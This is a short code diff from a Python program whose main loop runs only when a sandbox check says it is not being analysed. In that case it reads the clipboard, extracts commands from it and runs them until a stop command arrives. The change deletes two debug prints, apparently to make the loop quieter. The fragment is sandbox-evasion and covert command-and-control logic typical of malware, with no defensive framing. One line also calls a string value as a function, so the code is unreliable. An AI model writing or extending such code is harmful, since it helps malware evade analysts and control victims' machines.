@@ -111,9 +111,7 @@ def main():
     while True:
         if not sandbox_check(verbose=False):  # Only run if NOT in a sandbox
             clipboard_data = fetch_clipboard_data()
-            print("Clipboard data: ", clipboard_data)
             commands = extract_commands(clipboard_data())
-            print(commands)
 
             for command in commands:
                 if command == done_cmd:
